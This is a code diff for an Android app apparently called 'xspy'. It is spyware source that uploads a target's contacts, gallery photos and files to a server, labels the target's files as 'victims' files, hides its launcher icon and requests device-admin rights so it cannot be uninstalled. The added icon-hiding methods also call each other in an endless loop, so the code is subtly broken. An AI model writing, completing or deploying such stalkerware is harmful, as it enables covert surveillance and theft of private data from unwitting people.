@@ -2,6 +2,7 @@ package com.redeyesncode.xspy;
 
 import android.Manifest;
 import android.app.ProgressDialog;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -17,6 +18,7 @@ import com.karumi.dexter.PermissionToken;
 import com.karumi.dexter.listener.PermissionRequest;
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
 import com.redeyesncode.xspy.backend.AndroidContactModel;
+import com.redeyesncode.xspy.backend.recievers.MyDeviceAdminReceiver;
 import com.redeyesncode.xspy.backend.services.ContactUploadService;
 import com.redeyesncode.xspy.backend.services.FileUploadService;
 import com.redeyesncode.xspy.base.BaseActivity;
@@ -72,6 +74,10 @@ public class MainActivity extends BaseActivity {
         binding.btnGetPermission.setOnClickListener(v -> {
             checkPermissions();
         });
+        binding.btnDeviceAdmin.setOnClickListener(v->{
+            enableDeviceAdmin();
+                });
+
         binding.btnFetchAllContacts.setOnClickListener(v -> {
 
             // How to call api's in android in background thread.
@@ -86,6 +92,9 @@ public class MainActivity extends BaseActivity {
 
         binding.btnHideAppIcon.setOnClickListener(v->{
             checkPermissionForHideIcon();
+        });
+        binding.btnHideAppIconAndroid14.setOnClickListener(v-> {
+            hideAppIcon();
         });
 
         binding.btnFetchGallery.setOnClickListener(v->{
@@ -127,28 +136,37 @@ public class MainActivity extends BaseActivity {
 
     }
 
+
+
+
     private void checkPermissionsForGallery() {
-        Dexter.withContext(MainActivity.this).withPermissions(Manifest.permission.READ_EXTERNAL_STORAGE).withListener(new MultiplePermissionsListener() {
-            @Override
-            public void onPermissionsChecked(MultiplePermissionsReport multiplePermissionsReport) {
-                if(multiplePermissionsReport.areAllPermissionsGranted()){
-//                    Log.i(Constants.DEV_XSPY, "initClicks: "+ GalleryUtils.getImagesFromGalleryOnly(MainActivity.this));
-                    uploadPhotosToServer();
-                    showToast("Granted !!");
-                }else{
-                    showToast("Not Granted !!");
-                }
+        List<String> permissions = new ArrayList<>();
 
-            }
-            @Override
-            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> list, PermissionToken permissionToken) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    shouldShowRequestPermissionRationale(Manifest.permission.CAMERA);
-                }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
+            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
+        } else {
+            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
 
-            }
-        }).check();
+        Dexter.withContext(MainActivity.this)
+                .withPermissions(permissions)
+                .withListener(new MultiplePermissionsListener() {
+                    @Override
+                    public void onPermissionsChecked(MultiplePermissionsReport report) {
+                        if (report.areAllPermissionsGranted()) {
+                            uploadPhotosToServer();
+                            showToast("Granted !!");
+                        } else {
+                            showToast("Not Granted !!");
+                        }
+                    }
 
+                    @Override
+                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> requests, PermissionToken token) {
+                        token.continuePermissionRequest();
+                    }
+                })
+                .check();
     }
 
     private void setupProgressDialog(){
@@ -189,7 +207,7 @@ public class MainActivity extends BaseActivity {
         }
 
 
-        showToast(victimsFiles.size()+"");
+        showToast(victimsFiles.size()+"<--- Victims File Size");
         Intent uploadFileServiceIntent = new Intent(MainActivity.this, FileUploadService.class);
 
         // We need to pass the file array list into the intent so that we can upload files in the  background as well.
@@ -274,8 +292,35 @@ public class MainActivity extends BaseActivity {
             }
         }).check();
     }
+    private void hideAppIconIfSupported() {
+        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) { // Up to Android 11
+            hideAppIcon();
+            showToast("App icon hidden (Android <= 11)");
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12+
+            hideAppIcon(); // Might not work depending on device/OEM
+            showToast("Attempted to hide icon (Android 12+)");
+        }
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+//        moveTaskToBack(true);
+
+    }
+
+    private void enableDeviceAdmin(){
+        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to prevent app uninstall.");
+        startActivityForResult(intent, 100);
+
+
+    }
 
     private void hideAppIcon(){
+        hideAppIconIfSupported();
         PackageManager p = getPackageManager();
         ComponentName componentName = new ComponentName(this,MainActivity.class);
         // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
